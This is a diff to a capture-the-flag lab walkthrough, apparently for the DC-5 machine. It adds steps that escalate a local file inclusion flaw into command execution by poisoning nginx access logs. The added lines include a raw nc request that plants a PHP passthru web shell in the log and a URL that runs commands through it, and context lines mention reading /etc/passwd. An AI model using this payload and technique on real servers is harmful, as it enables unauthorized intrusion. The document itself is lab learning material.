@@ -27,7 +27,16 @@ By DCAU
 * Interestingly, if we did not include any file to load in the parameter, the footer contents would disappear, i.e. no Copyright © 2019 would be retrieved.
 * Also, `/etc/passwd` seems to be one of the common files used to test for LFI, because I guess virtually everyone would have that file on their web servers. Attempting to load a file that does not exist may lead us to be mistaken that LFI is not present.
 * As much as we now know a list of users, we do not have a login page or ssh to attempt our logins.
-* To-be-continued...
+* It turns out that to get our shell, we would have to exploit it through the *nginx access logs*.
+* First, we have to find out where the access logs are located. A common location of the file is `/var/log/nginx/access.log`. Run: `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log`:
+![](/screenshots/dc-5/nginxAccessLog.jpg)
+* Note: For Apache2 web servers, the location is also likely to be the same, except that it would be found under the `apache2` directory in `/var/log` instead.
+* We can now confirm that we are able to retrieve the access logs, which span many, many pages.
+* I accessed `http://10.0.2.11/testing-out-that-i-am-able-to-read-the-access-logs`, just to test out what we know about the access logs - that these files record all requests processed by the server.
+![](/screenshots/dc-5/nginxAccessLogTest.jpg)
+* Note: The latest records are found at the bottom of the log file.
+* Next, run `nc 10.0.2.11 80`, then enter `GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1`.
+* After that, run `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log&cmd=id` and refresh the page to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs.
 
 # Other walkthroughs visited
 1. https://bzyo.github.io/dc-5/
